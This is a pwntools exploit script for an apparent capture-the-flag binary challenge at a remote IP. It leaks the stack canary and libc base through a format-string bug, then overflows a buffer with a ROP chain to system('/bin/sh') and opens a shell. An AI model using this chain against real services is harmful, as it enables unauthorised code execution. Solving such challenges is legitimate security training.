#!/usr/bin/env python3
from pwn import *
from subprocess import Popen
# =========================================================
#                          SETUP                         
# =========================================================
exe = './super_jumpio_kart'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "94.237.55.43", 40498


gdbscript = '''
init-pwndbg
b *race+677
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "./run"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if args.QEMU:
        gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
        for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
            gdb_args.extend(["-ex", cmd])
        Popen(gdb_args)
    elif args.DOCKER:
        gdbscript = f'''
        init-pwndbg
        set sysroot /proc/{pid}/root
        c
        '''.format(**locals())        
        attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='chall')
    else:
        attach(io, gdbscript=gdbscript)


# =========================================================
#                         EXPLOITS
# =========================================================
def ret2system():
    rop = ROP(libc)
    rop.raw(rop.ret.address)
    rop.system(next(libc.search(b'/bin/sh')))
    return rop.chain()

def exploit():
    global io
    io = initialize()
    with log.progress("Leak libc & canary") as p:
        io.sendlineafter(b'> ', b'4')
        io.sendlineafter(b': ', b'%9$p.%12$p')
        io.recvuntil(b'with: ')
        canary, libc_leak = io.recvline().strip().split(b".")
        canary = int(canary, 16)
        libc_leak = int(libc_leak, 16)
        libc.address = libc_leak - 0x203b20

    log.info("Canary: %#x", canary)
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base address: %#x", libc.address)
    with log.progress("Entering BOF and get shell with ret2system"), context.silent:
        for i in range(7):
            io.recvuntil(b"Warning! ")
            payload = io.recv(1)
            io.sendafter(b': ', payload)
        io.sendafter(b'> ', b"y")
        offset = 72
        payload = flat({offset:[canary, 0, 0, 0, ret2system()]}, filler=b"\x00")
        io.sendafter(b': ', payload)

    io.interactive()

if __name__ == '__main__':
    exploit()
